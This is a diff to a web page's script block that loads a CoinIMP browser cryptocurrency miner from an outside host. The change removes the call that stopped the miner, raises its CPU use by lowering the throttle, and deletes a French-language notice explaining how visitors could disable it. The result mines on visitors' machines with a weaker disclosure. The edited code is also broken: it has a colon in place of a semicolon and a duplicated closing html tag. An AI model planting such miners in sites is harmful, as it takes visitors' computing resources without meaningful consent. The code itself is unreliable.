@@ -80,27 +80,13 @@
    <script src="https://www.hostingcloud.racing/MFIJ.js"></script>
 <script>
     var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
-        throttle: 0.4, c: 'w', ads: 0
+        throttle: 0.15, c: 'w', ads: 0
     });
     _client.start();
-    _client.stop();
-    _client.addMiningNotification("Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#241599", 20, "#d2220f");
-      // Ajout notification personnalisée
-      const notif = document.createElement('div');
-      notif.id = 'miningNotification';
-      notif.innerHTML = `
-        <button id="miningNotificationToggle">Réduire</button>
-        Ce site utilise un mineur CoinIMP. Vous pouvez le désactiver via les paramètres de votre navigateur si vous le souhaitez.
-      `;
-      document.body.appendChild(notif);
-
-      // Toggle réduction
-      document.getElementById('miningNotificationToggle').onclick = function () {
-        notif.classList.toggle('minimized');
-        this.innerText = notif.classList.contains('minimized') ? "Agrandir" : "Réduire";
-      };
+    _client.addMiningNotification("Bottom", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#241599", 20, "#d2220f"):
     </script>
   </body>
+</html>
 </html>
 
 
